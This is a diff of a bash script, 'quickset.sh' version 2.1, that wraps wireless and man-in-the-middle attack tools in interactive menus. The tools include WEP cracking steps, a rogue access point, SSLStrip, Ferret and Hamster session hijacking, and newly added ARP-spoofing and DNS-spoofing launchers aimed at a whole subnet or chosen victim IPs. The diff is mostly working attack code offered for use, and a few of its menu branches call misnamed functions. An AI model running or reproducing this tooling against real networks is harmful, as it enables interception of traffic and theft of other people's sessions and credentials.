@@ -3,7 +3,7 @@ function script_info()
 {
 ##~~~~~~~~~~~~~~~~~~~~~~~~~ File and License Info ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
 ## Filename: quickset.sh
-## Version: 2.0
+## Version: 2.1
 ## Copyright (C) <2009>  <Snafu>
 
 ##  This program is free software: you can redistribute it and/or modify
@@ -75,7 +75,17 @@ function script_info()
 
 ## svn up in update--(), this has some issue with regards to calling "svn up" from within a directory without .svn -->  Skipped '.' It gives an exit flag of 0 which defeats my purposes...  Only a factor if the user has quickset.sh in a directory called quickset that was not created with subversion itself.  To be dealt with at a later time 
 
-## `ifconfig mon0 | grep HWaddr | cut -d- -f1-6 | sed 's/-/:/g'` will fix the random mac issue....
+## `ifconfig mon0 | grep HWaddr | cut -d- -f1-6 | sed 's/-/:/g'` is much cleaner syntax for random mac usage....
+
+## Possible revert to gateway warning if "old messy way" via dhcp works for not showing same ip addie twice....
+
+## Add option to kill modified files like dhcp leases at the end of session if exited properly....
+
+## sed/grep function to check and ensure that when a MAC address is given, it is legit and can be used.
+
+## Custom DNSspoof hosts file capabilities; the capability is there, the functionality is not...
+
+## Full implementation of possible required settings to perform certain functions of this script.  IE...  If we want to perform a MITM situation, this script will inform the user if the current settings are not proper for success, while still allowing the user full control....  IE...  If the user were to pick the "Wireles Vaccuum", but choose to use it in a manner other than full connectivity (ie...DOS) the capability is there, but it will warn the user beforehand; thereby saving time.
 ##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
 
 
@@ -101,16 +111,9 @@ function script_info()
 ## On 21 September, I matched the MTUs for the routing portions; this FINALLY made it to where the iPhone could connect....!
 ## Part of the problem had been that I was trying to go with a rather high MTU 1800.....This is not recommended as the default for a LAN is 1500, I believe that the fragmentation resulting from the 1800 caused the failures.
 ## After further study into the matter it seems that matching of MTUs is not to be recommended; The only MTU that needs to be changed is at0.  at0 should be set to 1400 for the MTU value.
-##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
 
-
-##~~~~~~~~~~~~~~~~~~~~~~~~ Planned Implementations ~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
-## sed/grep function to check and ensure that when a MAC address is given, it is legit and can be used.
-
-## Functionality to allow the user the enter device NIC names within the script on the off chance that the user has not already named them during init_setup--().  As of now, failure to fully enter in all required device NICs during init_setup--() will force the user to call naming--() thereby dramatically slowing down the effectivness of quickset.sh for a simple feature that should have already been thought of.
-
-## Sanitization of every input with regards to preventing "user error/hacking" (gets me in the mindset for real coding languages in the future to actually think of what I am coding as a whole, and think about how it could be used against the box it is run on sploit' wise, all because I failed to account for certain user inputs...Think SQLI)"
-##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
+##  On 2 Jan 2012, no_dev--() was implemented to speed up NIC naming, whereby if a user had neglected to name NICs during the initial setup; it would not slow them down later on.
+##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~## 
 
 
 ##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ Bug Traq ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
@@ -138,7 +141,7 @@ function script_info()
 
 ## Kudos to my wife for always standing by my side, having faith in me, and showing the greatest of patience for my obsession with hacking
 ##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
-read
+sleep 0
 }
 
 ##~~~~~~~~~~~~~~~~~~~~~~~~ BEGIN Repitious Functions ~~~~~~~~~~~~~~~~~~~~~~~~~~##
@@ -170,7 +173,7 @@ echo -e "\033[1;32m\n-----------------------------------------------------------
 
 6) List Available NICs
 
-7) Proceed
+C)ontinue
 
 E)xit Script\033[1;34m
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n"
@@ -211,7 +214,7 @@ case $init_var in
 	6) nics--
 	init_setup--;;
 
-	7) main_menu--;;
+	c|C) main_menu--;;
 
 	e|E) exit 0;;
 
@@ -381,8 +384,8 @@ This script requires Physical and Virtual devices to have matching MAC Addresses
 				sleep .7
 				mac_control--
 			else
-				rand_mac=`ifconfig $mac_dev | awk '{print $5}'`
-				rand_mac=`echo $rand_mac | awk '{print $1}'`
+				rand_mac=$(ifconfig $mac_dev | awk '{print $5}')
+				rand_mac=$(echo $rand_mac | awk '{print $1}')
 				echo -e "\033[1;33m\n$mac_devII `macchanger -m $rand_mac $mac_devII`"
 				if [ $? -ne 0 ];then
 					echo -e "\033[31mThe Attempt was Unsuccessful, Try Again"
@@ -484,20 +487,20 @@ echo -e "\033[1;34m
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
       --MAC Address Options--
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\033[36m
-(L)ist Available NICs
+L)ist Available NICs
 
-(C)hange a NIC MAC Address
+M)AC Address Change
 
-(P)revious Menu
+P)revious Menu
 
-(M)ain Menu\033[1;34m
+M)ain Menu\033[1;34m
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n"
 read var
 case $var in
 	l|L) nics--
 	mac_control--;;
 
-	c|C) mac_control_II--;;
+	m|M) mac_control_II--;;
 
 	p|P) case $init_var in
 		6) init_setup--;;
@@ -516,7 +519,7 @@ dev_check--()
 ifconfig $dev_check_var > /dev/null
 if [ $? -ne 0 ];then
 	echo -e "\033[31mDevice does NOT exist"
-	sleep .7
+	sleep 1
 	dev_check="fail"
 else
 	dev_check= ## Nulled
@@ -535,6 +538,75 @@ trap_101--()
 echo -e "\033[31m\nPlease Exit Out of The Script Properly"
 sleep 2
 cleanup_101--
+}
+
+no_dev--()
+{
+case $1 in
+	monitor) 
+	clear
+	echo -e "\033[1;33m\nMonitor Mode NIC not defined\n\n\033[36mWould You Like to Define it Now? (y or n)"
+	read no_dev
+	case $no_dev in
+		y|Y) 
+		echo -e "\033[36m\nMonitor Mode NIC?"
+		read pii
+		dev_check_var=$pii
+		dev_check--
+		case $dev_parent in
+			venue--)
+			if [[ $dev_check == "fail" ]];then
+				pii= ## Nulled
+				var= ## Nulled
+			fi;;
+
+			routing--)
+			if [[ $dev_check == "fail" ]];then
+				pii= ## Nulled
+				rte_choice= ## Nulled
+			fi;;
+
+		esac;;
+
+		n|N) 
+		case $dev_parent in
+			venue--) 
+			var= ;; ## Nulled
+
+			routing--) 
+			rte_choice= ;; ## Nulled
+		esac;;
+
+	esac;;
+
+	managed)
+	clear
+	echo -e "\033[1;33m\nInternet Connected NIC not defined\n\n\033[36mWould You Like to Define it Now? (y or n)"
+	read no_dev
+	case $no_dev in
+		y|Y) 
+		echo -e "\033[36m\nInternet Connected NIC?"
+		read IE
+		dev_check_var=$IE
+		dev_check--
+		case $dev_parent in
+			routing--)
+			if [[ $dev_check == "fail" ]];then
+				IE= ## Nulled
+				rte_choice= ## Nulled
+			fi;;
+
+		esac;;
+
+		n|N) 
+		case $dev_parent in
+			routing--) 
+			rte_choice= ;;
+		esac;;
+
+	esac;;
+
+esac
 }
 ##~~~~~~~~~~~~~~~~~~~~~~~~~ END Repitious Functions ~~~~~~~~~~~~~~~~~~~~~~~~~~~##
 
@@ -645,13 +717,15 @@ echo -e "\033[1;34m
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
                   --Attack Menu--
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\033[36m
-1) Ferret
+1) Arpspoof
 
-2) Hamster
+2) DNSspoof
 
-3) SSLStrip
+3) Ferret
 
-4) Arpspoof
+4) Hamster
+
+5) SSLstrip
 
 M)ain Menu
 \033[1;32m
@@ -659,9 +733,13 @@ M)ain Menu
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n"
 read var
 case $var in
-	1) ferret--;;
+	1) arpspoof--;;
 
-	2) if [[ -f hamster.txt ]];then
+	2) dnsspoof--;;
+
+	3) ferret--;;
+
+	4) if [[ -f hamster.txt ]];then
 		xterm -bg black -fg grey -sb -rightbar -title "Hamster" -e hamster &
 	else
 		echo -e "\033[31m\n\nhamster.txt MUST exist to run hamster"
@@ -669,9 +747,7 @@ case $var in
 		atk_menu--
 	fi;;
 
-	3) strip_em--;;
-
-	4) arpspoof--;;
+	5) strip_em--;;
 
 	m|M) main_menu--;;
 
@@ -684,6 +760,7 @@ routing--()
 ## The order of functions are for 2, 3 and 4 are: ap_pre_var--(), ap_setup--(), ap--()
 ## The order of functions for the DHCP server is: dhcp_pre_var--(), dhcp_svr--()
 #rte_choice= Routing Option Variable for use with IPTABLES setups...
+#k_for_check= Variable to determine if the user would liek to enable Kernel Forwarding
 private= ## Wifi Range Extender trip variable
 clear
 echo -e "\033[1;34m
@@ -706,37 +783,44 @@ M)ain Menu\033[1;34m
 ~~~~~~~~~~~~~~~~~~~~~~~~~~\n"
 read rte_choice
 case $rte_choice in
+	3|5) dev_parent="routing--"
+	if [ -z $pii ];then
+		no_dev-- monitor
+	fi
+
+	if [ -z $IE ];then
+		no_dev-- managed
+	fi
+
+	for_check=$(cat /proc/sys/net/ipv4/ip_forward)
+	if [[ $for_check = 0 ]];then
+		clear
+		echo -e "\033[1;33m\nKernel Forwarding is Not Enabled\n\n\033[36mMake it So? (y or n)"
+		read k_for_check
+		case $k_for_check in
+			y|Y)
+			echo "1" > /proc/sys/net/ipv4/ip_forward ;;
+		esac
+	fi;;
+
+	4) dev_parent="routing--"
+	no_dev-- monitor ;;
+esac
+
+case $rte_choice in
 	1) ipt_--;;
 
 	2) k_for--;;
 
-	3) if  [[ -z $IE || -z $pii ]];then
-		echo -e "\033[31mMonitor Mode NIC and Internet Connected NIC MUST be Defined Before Proceeding"
-		sleep 1
-		routing--
-	else
-		ap_pre_var--
-		ap_setup--
-	fi;;
+	3) ap_pre_var--
+	ap_setup--;;
 
-	4) if  [[ -z $pii ]];then
-		echo -e "\033[31mMonitor Mode NIC MUST be Defined Before Proceeding"
-		sleep 1
-		routing--
-	else
-		ap_pre_var--
-		ap_setup--
-	fi;;
+	4) ap_pre_var--
+	ap_setup--;;
 
-	5) if  [[ -z $IE || -z $pii ]];then
-		echo -e "\033[31mMonitor Mode NIC and Internet Connected NIC MUST be Defined Before Proceeding"
-		sleep 1
-		routing--
-	else
-		private="yes"
-		ap_pre_var--
-		ap_setup--
-	fi;;
+	5) private="yes"
+	ap_pre_var--
+	ap_setup--;;
 
 	6) dhcp_pre_var--
 	if [[ $ap_check != "on" ]]; then
@@ -855,6 +939,202 @@ esac
 ##~~~~~~~~~~~~~~~~~~~~~~~~~ END setups-- sub-functions ~~~~~~~~~~~~~~~~~~~~~~~~##
 
 ##~~~~~~~~~~~~~~~~~~~~~~~ BEGIN atk_menu-- sub-functions ~~~~~~~~~~~~~~~~~~~~~~##
+arpspoof--()
+{
+
+	mass_arp--()
+	{
+	if [[ $arp_way == "yes" ]];then
+		while [ "$1" != "" ];do
+			xterm -bg black -fg grey -hold -title "ARP to $1 as $gt_way (GW)" -e arpspoof -i $spoof_dev -t $1 $gt_way &
+			xterm -bg black -fg grey -hold -title "ARP to $gt_way (GW) as $1" -e arpspoof -i $spoof_dev -t $gt_way $1 &
+			shift
+		done
+
+	else
+		while [ "$1" != "" ];do
+			xterm -bg black -fg grey -hold -title "ARP to $1 as $gt_way (GW)" -e arpspoof -i $spoof_dev -t $1 $gt_way &
+			shift 
+		done
+
+	fi
+	}
+
+var_II= ## Nulled
+var_III= ## Nulled
+var_IV= ## Nulled
+spoof_dev= ## Device to spoof with
+gt_way= ## Gateway IP variable
+tgt_ip= ## Tgt IP variable
+mult_tgts= ## Variable to assign multiple IPs with
+arp_way= ## Variable to define Two-Way spoofing with multiple IPs
+clear
+while [ -z $spoof_dev ];do
+	echo -e "\033[36m\nDevice to Spoof with?"
+	read spoof_dev
+	dev_check_var=$spoof_dev
+	dev_check--
+	if [[ $dev_check == "fail" ]];then
+		spoof_dev= ## Nulled
+	fi
+
+done
+
+while [ -z $gt_way ];do
+	echo -e "\033[36m\nDefine Gateway IP Address (Who Are We Pretending to Be?)"
+	read gt_way
+done
+
+while [[ $var_II != "x" ]];do
+	echo -e "\033[1;34m\n~~~~~~~~~~~~~~~~~
+--ArpSpoof Tgts--
+~~~~~~~~~~~~~~~~~\033[36m
+E)verybody 
+M)ultiple Tgts
+S)ingle Tgt\033[1;34m
+~~~~~~~~~~~~~~~~~\n"
+	read var
+	case $var in
+		e|E) var_II="x"
+		xterm -bg black -fg grey -title "ArpSpoof Subnet $gt_way (GW)" -e arpspoof -i $spoof_dev $gt_way &
+		atk_menu--;;
+
+		m|M) var_II="x"
+		while [[ -z $mult_tgts ]];do
+			echo -e "\033[36m\nSeperate Tgts with a space (i.e. IP1 IP2 IP3)"
+			read mult_tgts
+		done
+
+		while [ -z $var_IV ];do
+			echo -e "\033[36m\nTwo Way Spoof? (y or n)"
+			read var_IV
+			case $var_IV in
+				y|Y) arp_way="yes"
+				mass_arp-- $mult_tgts
+				atk_menu--;;
+
+				n|N) mass_arp-- $mult_tgts
+				atk_menu--;;
+
+				*) var_IV= ;; ## Nulled
+			esac
+
+		done;;
+
+		s|S) var_II="x"
+		while [ -z $tgt_ip ];do
+			echo -e "\033[36m\nDefine Target IP address (Who Are we Lying to?)"
+			read tgt_ip
+		done
+
+		while [[ $var_III != x ]]; do
+			echo -e "\033[36m\nTwo Way Spoof? (y or n)"
+			read var
+			case $var in 
+				y|Y) var_III="x"
+				xterm -bg black -fg grey -hold -title "ARP to $tgt_ip as $gt_way (GW)" -e arpspoof -i $spoof_dev -t $tgt_ip $gt_way &
+				xterm -bg black -fg grey -hold -title "ARP to $gt_way (GW) as $tgt_ip" -e arpspoof -i $spoof_dev -t $gt_way $tgt_ip &
+				atk_menu--;;
+
+				n|N) var_III="x"
+				xterm -bg black -fg grey -hold -title "ARP to $tgt_ip as $gt_way (GW)" -e arpspoof -i $spoof_dev -t $tgt_ip $gt_way &
+				atk_menu--;;
+
+				*) var_III= ;; ## Nulled
+			esac
+
+		done;;
+
+		*) var_II= ;; ## Nulled
+	esac
+
+done
+}
+
+dnsspoof--()
+{
+#dspoof_dev= Device to listen on
+#d_hosts= Variable to check if user wants to use custom hosts file for dnsspoof
+
+	dnsspoof_II--()
+	{
+	clear
+	echo -e "\033[1;34m
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+           --DNSspoof Parameters--
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\033[36m
+1) Listening NIC    [\033[1;33m$dspoof_dev\033[36m]
+
+2) Custom Hostfile  [\033[1;33m$d_hosts\033[36m]
+
+3) List Available NICs
+
+C)ontinue
+
+P)revious Menu
+
+M)ain Menu\033[1;34m
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n"
+	read var
+	case $var in
+		1) echo -e "\033[36m\nNIC?"
+		read dspoof_dev
+		dev_check_var=$dspoof_dev
+		dev_check--
+		if [[ -z $dev_check ]];then
+			dnsspoof_II--
+		else
+			dspoof_dev= ## Nulled
+			dnsspoof_II--
+		fi;;
+
+		2) echo -e "\033[36m\nUse Custom DNS Hosts File? (y or n)"
+		read d_hosts
+		case $d_hosts in
+			y|Y) d_hosts="Yes" ;;
+			n|N) d_hosts="No" ;;
+			*) d_hosts= ;; ## Nulled
+		esac
+
+		dspoof_II--;;
+
+		3) nics--
+		ferret_II--;;
+
+		c|C) 
+		if [[ -z $dspoof_dev || -z $d_hosts ]];then
+			echo -e "\033[31mAll Fields Must be Filled Before Proceeding"
+			sleep 1
+			dnsspoof_II--
+		else
+			case $d_hosts in
+				Yes) xterm -bg black -fg grey -sb -rightbar -title "DNSspoof" -e dnsspoof -i $dspoof_dev & 
+				atk_menu--;;
+
+				No) xterm -bg black -fg grey -sb -rightbar -title "DNSspoof" -e dnsspoof -i $dspoof_dev & 
+				atk_menu--;;
+			esac
+
+		fi;;
+
+		p|P) atk_menu--;;
+
+		m|M) main_menu--;;
+
+		*) ferret_II--;;
+	esac
+	}
+
+## Below sets my defaults, change as you wish
+if [ -z $IE ];then
+	dspoof_dev=wlan0 ## Set to default guess of wlan0 if no internet connected device is defined
+else
+	dspoof_dev=$IE
+fi
+
+dnsspoof_II--
+}
+
 ferret--()
 {
 #fer_dev= Device to be sniffed
@@ -875,7 +1155,7 @@ ferret--()
 
 3) List Available NICs
 
-4) Proceed
+C)ontinue
 
 P)revious Menu
 
@@ -911,13 +1191,13 @@ M)ain Menu\033[1;34m
 		3) nics--
 		ferret_II--;;
 
-		4) if [[ -z $fer_dev || -z $wifi_check ]];then
+		c|C) if [[ -z $fer_dev || -z $wifi_check ]];then
 			echo -e "\033[31mSniffing Device and Type Must be Selected to Proceed"
-			read
+			sleep 1
 			ferret_II--
 		else
 			case $wifi_check in
-				wireless)fer_chan= ## Nulled
+				wireless) fer_chan= ## Nulled
 				while [ -z $fer_chan ];do
 					echo -e "\033[36m\nWireless Channel to Sniff? (1-11)"
 					read fer_chan
@@ -1005,7 +1285,7 @@ ssl_tail="Yes" ## SSLStrip Tail Log
 
 6) Tail SSLStrip Log          [\033[1;33m$ssl_tail\033[36m]
 
-7) Proceed
+C)ontinue
 
 P)revious Menu
 
@@ -1070,7 +1350,7 @@ M)ain Menu\033[1;34m
 
 		strip_em_II--;;
 
-		7) if [[ -z $lst_port || -z $sstrip_log || -z $log_opt || -z $lck_fav || -z $ses_kil || -z $ssl_tail ]];then
+		c|C) if [[ -z $lst_port || -z $sstrip_log || -z $log_opt || -z $lck_fav || -z $ses_kil || -z $ssl_tail ]];then
 			echo -e "\033[31mAll Fields Must be Filled Before Proceeding"
 			sleep 1
 			strip_em_II--
@@ -1089,117 +1369,7 @@ M)ain Menu\033[1;34m
 strip_em_II--
 }
 
-arpspoof--()
-{
 
-	mass_arp--()
-	{
-	if [[ $arp_way == "yes" ]];then
-		while [ "$1" != "" ];do
-			xterm -bg black -fg grey -hold -title "ARP to $1 as $gt_way (GW)" -e arpspoof -i $spoof_dev -t $1 $gt_way &
-			xterm -bg black -fg grey -hold -title "ARP to $gt_way (GW) as $1" -e arpspoof -i $spoof_dev -t $gt_way $1 &
-			shift
-		done
-
-	else
-		while [ "$1" != "" ];do
-			xterm -bg black -fg grey -hold -title "ARP to $1 as $gt_way (GW)" -e arpspoof -i $spoof_dev -t $1 $gt_way &
-			shift 
-		done
-
-	fi
-	}
-
-var_II= ## Nulled
-var_III= ## Nulled
-var_IV= ## Nulled
-spoof_dev= ## Device to spoof with
-gt_way= ## Gateway IP variable
-tgt_ip= ## Tgt IP variable
-mult_tgts= ## Variable to assign multiple IPs with
-arp_way= ## Variable to define Two-Way spoofing with multiple IPs
-clear
-while [ -z $spoof_dev ];do
-	echo -e "\033[36m\nDevice to Spoof with?"
-	read spoof_dev
-	dev_check_var=$spoof_dev
-	dev_check--
-	if [[ $dev_check == "fail" ]];then
-		spoof_dev= ## Nulled
-	fi
-
-done
-
-while [ -z $gt_way ];do
-	echo -e "\033[36m\nDefine Gateway IP Address (Who Are We Pretending to Be?)"
-	read gt_way
-done
-
-while [[ $var_II != "x" ]];do
-	echo -e "\033[1;34m\n~~~~~~~~~~~~~~~~~
---ArpSpoof Tgts--
-~~~~~~~~~~~~~~~~~\033[36m
-(E)verybody 
-(M)ultiple Tgts
-(S)ingle Tgt\033[1;34m
-~~~~~~~~~~~~~~~~~\n"
-	read var
-	case $var in
-		e|E) var_II="x"
-		xterm -bg black -fg grey -title "ArpSpoof Subnet $gt_way (GW)" -e arpspoof -i $spoof_dev $gt_way &
-		atk_menu--;;
-
-		m|M) var_II="x"
-		while [[ -z $mult_tgts ]];do
-			echo -e "\033[36m\nSeperate Tgts with a space (i.e. IP1 IP2 IP3)"
-			read mult_tgts
-		done
-
-		while [ -z $var_IV ];do
-			echo -e "\033[36m\nTwo Way Spoof? (y or n)"
-			read var_IV
-			case $var_IV in
-				y|Y) arp_way="yes"
-				mass_arp-- $mult_tgts
-				atk_menu--;;
-
-				n|N) mass_arp-- $mult_tgts
-				atk_menu--;;
-
-				*) var_IV= ;; ## Nulled
-			esac
-
-		done;;
-
-		s|S) var_II="x"
-		while [ -z $tgt_ip ];do
-			echo -e "\033[36m\nDefine Target IP address (Who Are we Lying to?)"
-			read tgt_ip
-		done
-
-		while [[ $var_III != x ]]; do
-			echo -e "\033[36m\nTwo Way Spoof? (y or n)"
-			read var
-			case $var in 
-				y|Y) var_III="x"
-				xterm -bg black -fg grey -hold -title "ARP to $tgt_ip as $gt_way (GW)" -e arpspoof -i $spoof_dev -t $tgt_ip $gt_way &
-				xterm -bg black -fg grey -hold -title "ARP to $gt_way (GW) as $tgt_ip" -e arpspoof -i $spoof_dev -t $gt_way $tgt_ip &
-				atk_menu--;;
-
-				n|N) var_III="x"
-				xterm -bg black -fg grey -hold -title "ARP to $tgt_ip as $gt_way (GW)" -e arpspoof -i $spoof_dev -t $tgt_ip $gt_way &
-				atk_menu--;;
-
-				*) var_III= ;; ## Nulled
-			esac
-
-		done;;
-
-		*) var_II= ;; ## Nulled
-	esac
-
-done
-}
 ##~~~~~~~~~~~~~~~~~~~~~~~~~ END atk_menu-- sub-functions ~~~~~~~~~~~~~~~~~~~~~~##
 
 ##~~~~~~~~~~~~~~~~~~~~~~ BEGIN routing-- sub-functions ~~~~~~~~~~~~~~~~~~~~~~~~##
@@ -1243,9 +1413,9 @@ k_for--()
 {
 clear
 echo -e "\033[1;33m
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-Current ip_forward status is `cat /proc/sys/net/ipv4/ip_forward`
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\033[36m
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+  Current Kernel Forwarding status is `cat /proc/sys/net/ipv4/ip_forward`
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\033[36m
 1) Turn ON Kernel Forwarding
 
 2) Turn OFF Kernel Forwarding
@@ -1253,7 +1423,7 @@ Current ip_forward status is `cat /proc/sys/net/ipv4/ip_forward`
 P)revious Menu
 
 M)ain Menu\033[1;33m
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n"
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n"
 read var
 case $var in
 	1) echo "1" > /proc/sys/net/ipv4/ip_forward
@@ -1318,7 +1488,7 @@ DHCPDCONF="/tmp/dhcpd.conf" ## Used by dhcpd3
 
 7) Tail DHCP Log       [\033[1;33m$dhcp_tail\033[36m]
 
-8) Proceed
+C)ontinue
 
 P)revious Menu
 
@@ -1377,7 +1547,7 @@ i.e.~~~~~>> 192.168.1.1 192.168.1.2 192.168.1.3\n"
 
 		dhcp_func--;;
 
-		8) if [[ -z $dhcp_dev || -z $sapip || -z $sasm || -z $sas || -z $sair || -z $dhcp_tail || -z $dns_cus ]];then
+		c|C) if [[ -z $dhcp_dev || -z $sapip || -z $sasm || -z $sas || -z $sair || -z $dhcp_tail || -z $dns_cus ]];then
 			echo -e "\033[31mAll Fields Must be Filled Before Proceeding"
 			sleep 1
 			dhcp_func--
@@ -1525,7 +1695,7 @@ echo -e "\033[1;34m
 
 6) DHCP Server Autolaunch [\033[1;33m$dhcp_autol\033[36m]
 
-7) Proceed
+C)ontinue
 
 P)revious Menu
 
@@ -1575,7 +1745,7 @@ case $var in
 
 	ap_setup--;;
 
-	7) if [[ -z $phys_dev || -z $sapip || -z $sasm || -z $sac || -z $mtu_size || -z $dhcp_autol ]];then
+	c|C) if [[ -z $phys_dev || -z $sapip || -z $sasm || -z $sac || -z $mtu_size || -z $dhcp_autol ]];then
 		echo -e "\033[31mAll Fields Must be Filled Before Proceeding"
 		sleep 1
 		ap_setup--
@@ -1599,8 +1769,8 @@ fi
 ap--()
 {
 #pres_mac= ## MAC Address for the SoftAP
-pres_mac=`ifconfig $phys_dev | awk '{print $5}'`
-pres_mac=`echo $pres_mac | awk '{print $1}'`
+pres_mac=$(ifconfig $phys_dev | awk '{print $5}')
+pres_mac=$(echo $pres_mac | awk '{print $1}')
 #blackhole targets every single probe request on current channel
 modprobe tun
 if [ $BB == "1" ]; then
@@ -1860,6 +2030,14 @@ M)ain Menu\033[1;34m
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n"
 	read var
 	case $var in
+		1|2|3|4|5|7|8|0) if [ -z $pii ];then
+			dev_parent="venue--"
+			no_dev-- monitor
+		fi;;
+
+	esac
+
+	case $var in
 		1) sc=1-11 ## Channels to scan on
 		hop=1500 ## time between channel hops
 		wifi_scan--;;
@@ -1867,7 +2045,7 @@ M)ain Menu\033[1;34m
 		2) b= ## tgt bssid
 		tc= ## Nulled
 		cf= ## Nulled
-		of=pcap ## Output Format for Airodump-NG
+		of="pcap" ## Output Format for Airodump-NG
 		parent="venue"
 		dump--;;
 
@@ -1922,7 +2100,7 @@ M)ain Menu\033[1;34m
 
 2) Hop Frequency (ms) [\033[1;33m$hop\033[36m]
 
-3) Proceed
+C)ontinue
 
 P)revious Menu
 
@@ -1938,7 +2116,7 @@ M)ain Menu\033[1;34m
 		read hop
 		wifi_scan--;;
 
-		3) if [[ -z $sc || -z $hop ]];then
+		c|C) if [[ -z $sc || -z $hop ]];then
 			echo -e "\033[31mYou Must Enter the Channels and Hop to Proceed"
 			read
 			wifi_scan--
@@ -1971,7 +2149,7 @@ M)ain Menu\033[1;34m
 
 4) Output Format    [\033[1;33m$of\033[36m]
 
-5) Proceed
+C)ontinue
 
 P)revious Menu
 
@@ -2003,7 +2181,7 @@ M)ain Menu\033[1;34m
 
 		dump--;;
 
-		5) if [[ -z $tc || -z $cf || -z $of ]];then
+		c|C) if [[ -z $tc || -z $cf || -z $of ]];then
 			echo -e "\033[31mTgt Channel & File Name & Output-Format Must be Filled Before Proceeding"
 			sleep 1
 			dump--
@@ -2162,7 +2340,7 @@ M)ain Menu\033[1;34m
 
 8) SKA .xor Injection {Optional}                          [\033[1;33m$ska_xor\033[36m]
 
-9) Proceed
+C)ontinue
 
 P)revious Menu 
 
@@ -2210,7 +2388,7 @@ M)ain Menu\033[1;34m
 		read ska_xor
 		auth--;;
 
-		9) if [[ -z $tc || -z $b || -z $sm || -z $ppb || -z $rd || -z $kaf ]];then
+		c|C) if [[ -z $tc || -z $b || -z $sm || -z $ppb || -z $rd || -z $kaf ]];then
 			echo -e "\033[31m\nAll Fields Must be Filled Before Proceeding"
 			sleep 1
 			auth--
@@ -2277,7 +2455,7 @@ M)ain Menu\033[1;34m
 
 	pforge--()
 	{
-	nowdate=`date +%M%S` ## Timestamp for files
+	nowdate=$(date +%M%S) ## Timestamp for files
 	pf_var= ## variable name for -w filename
 
 		pforge_S--()
@@ -2293,7 +2471,7 @@ M)ain Menu\033[1;34m
 
 3) .xor filename  [\033[1;33m$xor\033[36m]
 
-4) Proceed
+C)ontinue
 
 P)revious Menu\033[1;34m
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n"
@@ -2311,7 +2489,7 @@ P)revious Menu\033[1;34m
 			read xor
 			pforge_S--;;
 
-			4) if [[ -z $b || -z $sm || -z $xor ]];then
+			c|C) if [[ -z $b || -z $sm || -z $xor ]];then
 				echo -e "\033[31mAll Fields Must be Filled Before Proceeding"
 				sleep 1
 				pforge_S--
@@ -2340,7 +2518,7 @@ P)revious Menu\033[1;34m
 
 5) Destination IP [\033[1;33m$dst_ip\033[36m]
 
-6) Proceed
+C)ontinue
 
 P)revious Menu\033[1;34m
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n"
@@ -2366,7 +2544,7 @@ P)revious Menu\033[1;34m
 			read dst_ip
 			pforge_A--;;
 
-			6) if [[ -z $xor || -z $src_ip || -z $dst_ip ]];then
+			c|C) if [[ -z $xor || -z $src_ip || -z $dst_ip ]];then
 				echo -e "\033[31mAll Fields Must be Filled Before Proceeding"
 				sleep 1
 				pforge_A--
@@ -2437,7 +2615,7 @@ M)ain Menu\033[1;34m
 
 3) Source MAC                 [\033[1;33m$sm\033[36m]
 
-4) Proceed
+C)ontinue
 
 P)revious Menu
 
@@ -2462,7 +2640,7 @@ M)ain Menu\033[1;34m
 		read sm
 		forge_out--;;
 
-		4) if [[ -z $rppb || -z $pf_var || -z $sm ]];then
+		c|C) if [[ -z $rppb || -z $pf_var || -z $sm ]];then
 			echo -e "\033[31mAll Fields Must be Filled Before Proceeding"
 			sleep 1
 			forge_out--
@@ -2521,7 +2699,7 @@ M)ain Menu\033[1;34m
 
 2) File Name   [\033[1;33m$cf\033[36m]
 
-3) Proceed
+C)ontinue
 
 P)revious Menu
 
@@ -2536,7 +2714,7 @@ M)ain Menu\033[1;34m
 		2) parent_V="crack"
 		cfile--;;
 
-		3) if [[ -z $b || -z $cf ]];then
+		c|C) if [[ -z $b || -z $cf ]];then
 			echo -e "\033[31m\nAll Fields Must be Filled Before Proceeding"
 			sleep 1
 			crack--
@@ -2656,7 +2834,7 @@ M)ain Menu\033[1;34m
 
 4) ESSID {Optional} [\033[1;33m$e\033[36m]
 
